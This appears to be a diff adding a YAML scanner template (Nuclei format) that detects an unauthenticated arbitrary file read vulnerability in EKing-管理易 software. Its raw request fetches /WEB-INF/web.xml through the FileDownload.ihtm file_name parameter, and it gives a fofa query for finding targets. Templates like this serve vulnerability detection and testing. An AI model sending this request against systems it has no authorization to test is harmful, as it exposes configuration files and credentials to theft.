@@ -1,0 +1,34 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?xml version=
+            - <web-app
+            - </web-app>
+            - <context-param>
+            - </context-param>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /FileDownload.ihtm?file_name=/WEB-INF/web.xml HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+id: EKing-FileDownload-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: app="EKing-管理易"
+        EKing-管理易 FileDownload 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: EKing-管理易 FileDownload 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/Nf-C_kGKzTun4PMekB7tHw
+    severity: high
+    tags:
+        - File reading
+        - EKing-管理易
+        - 管理易
